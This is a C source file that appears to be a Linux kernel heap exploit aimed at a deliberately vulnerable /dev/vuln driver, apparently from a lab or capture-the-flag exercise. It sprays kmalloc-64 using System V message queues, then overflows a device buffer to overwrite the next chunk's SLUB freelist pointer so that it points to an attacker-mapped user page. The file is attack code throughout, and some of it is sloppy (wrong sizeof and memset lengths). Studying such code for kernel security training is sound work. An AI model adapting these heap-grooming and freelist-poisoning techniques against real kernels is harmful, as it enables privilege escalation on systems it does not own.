#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_SIZE 4096

int fd = -1;

void open_dev(){
	fd = open("/dev/vuln", O_RDWR);
	if(fd < 0){
		puts("[!] Error opening device");
		exit(-1);
	}
	puts("[*] Opened device");
}

void dev_write(char* buf, size_t n){
	if(write(fd, buf, n)<0) {
		puts("[!] Error writing to device");
		//exit(-1);
	}
	puts("[*] Wrote to device");
}

char* dev_read(char* buf) {
	char* output = (char*)read(fd, buf, sizeof(buf));
	if (output <= 0){
		puts("[!] Error reading from device");
		exit(-1);
	}
	puts("[*] Read from device");
	return output;
}

// we want kmalloc-64
#define MSIZE 64-48

struct {
	long mtype;
	char mtext[MSIZE];
} msg;

void spray_heap(size_t n) {
	memset(msg.mtext, 0x42, MSIZE-1);
	msg.mtext[MSIZE] = 0;
	msg.mtype = 1;
	int msqids[n];
	size_t i;
	for(i=0; i<n; i++) {
		msqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0);
	}

	for(i=0; i<n; i++) {
		if (msgrcv(msqids[i], &msg.mtext, sizeof(msg.mtext), 0, 0) == -1)
		      perror("msgrcv");
	}
}

void alloc_msg() {
	int id = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	msgsnd(id, &msg, sizeof(msg.mtext), 0);
	//msgrcv(id, &msg.mtext, sizeof(msg.mtext), 0, 0);
}

void hex_dump(unsigned long *buff, unsigned long size) {
	int i,j;
	for (i = 0; i < size/8; i++) {
		if(i % 2 == 0) {
			if (i != 0)												printf("  \n");
		printf("  %04x  ", i*8);
		}
		unsigned long ptr = ((unsigned long *)(buff))[i];
		printf("0x%016lx", ptr);
		printf("    ");
	}
	printf("\n");
}

int main() {
	open_dev();
	unsigned long evil[16];
	memset(evil, 0, 128);
	/*if we don't "warmup" the slab the setup we want
	 *
	 * 64 null
	 * freelist
	 * 64 null
	 * freelist
	 *
	 * won't happen
	 * */
	spray_heap(0xfff);
	unsigned long* user_page = (unsigned long*)
				mmap((void*)0xdeaddead000, PAGE_SIZE,
				PROT_READ|PROT_WRITE,
				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
			       	-1, 0);
	size_t sz = PAGE_SIZE/sizeof(unsigned long);
	unsigned long null_bytes[sz];
	memset(null_bytes, 0, sz);
	int offset = 0;
	for(size_t i=4; i<sz; i+=8){
		null_bytes[i] = 0xdeaddead000 + (offset*0x40);
		offset++;
	}
	memcpy(user_page, null_bytes, sz);
	// overwrite freelist of next chunk
	evil[12] = (unsigned long)user_page;
	evil[0] = 0x0a; // add newline to prevent
	hex_dump((char*)user_page, sz);
	dev_write((char*)evil, 128);
	spray_heap(0xfff);
	hex_dump(user_page, sz);
}
